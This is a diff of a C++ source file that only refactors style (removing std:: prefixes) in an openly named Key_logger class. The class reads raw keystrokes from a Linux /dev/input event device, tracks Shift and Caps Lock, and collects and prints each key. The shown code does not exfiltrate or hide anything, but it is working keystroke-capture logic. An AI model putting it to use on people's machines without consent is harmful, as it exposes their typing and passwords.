@@ -17,6 +17,7 @@
 #include <assert.h>
 #include <fstream>
 #include <sstream>
+using namespace std;
 
 int check_path(int result)
 {
@@ -37,7 +38,7 @@ bool isLetter(const int value)
 
 class Key_logger{
 private:
-    std::map<unsigned short, std::string> keys;
+    map<unsigned short, string> keys;
 public:
     Key_logger(){
         
@@ -196,17 +197,17 @@ public:
     struct input_event t;
     //struct input_event t_shift;
     keys_fd = check(open(DEV_PATH, O_RDONLY));
-    char Name[100];
-    std::cout << "Enter the name of the user >> ";
-    std::cin >> Name;
+    string Name;
+    cout << "Enter the name of the user >> ";
+    cin >> Name;
     //auto path = strcat(Name, ".txt");
 
-    std::vector<std::string> names;
+    vector<string> names;
     bool flag_shift = false;
     bool flag_caps = false;
     if (keys_fd <= 0)
     {
-        std::cout << "open/dev/input/event1 device error!" << std::endl;
+        cout << "open/dev/input/event1 device error!" << endl;
         return;
     }
     while (true)
@@ -224,7 +225,7 @@ public:
                         flag_shift = false;
                     if (t.code == 58 && t.value == 1)
                     {
-                        std::cout << "Changed!" << std::endl;
+                        cout << "Changed!" << endl;
                         flag_caps = !flag_caps;
                     }
 
@@ -233,17 +234,17 @@ public:
                         if (flag_shift == true && flag_caps == false)
                         {
                             names.push_back(keys[t.code + 1000]);
-                            std::cout << "key1 " << keys[t.code + 1000] << std::endl;
+                            cout << "key1 " << keys[t.code + 1000] << endl;
                         }
                         else if (flag_caps == true && flag_shift == false)
                         {
                             names.push_back(keys[t.code + 1000]);
-                            std::cout << "key2 " << keys[t.code + 1000] << std::endl;
+                            cout << "key2 " << keys[t.code + 1000] << endl;
                         }
                         else
                         {
                             names.push_back(keys[t.code]);
-                            std::cout << "key3 " << keys[t.code] << std::endl;
+                            cout << "key3 " << keys[t.code] << endl;
                         }
                     }               
                     else if (t.value == 1 && !isLetter(t.code))
@@ -251,12 +252,12 @@ public:
                         if (flag_shift == true)
                         {
                             names.push_back(keys[t.code + 1000]);
-                            std::cout << "key4 " << keys[t.code + 1000] << std::endl;
+                            cout << "key4 " << keys[t.code + 1000] << endl;
                         }
                         if (flag_shift == false)
                         {
                             names.push_back(keys[t.code]);
-                            std::cout << "key5 " << keys[t.code] << std::endl;
+                            cout << "key5 " << keys[t.code] << endl;
                         }
                     }
                 }
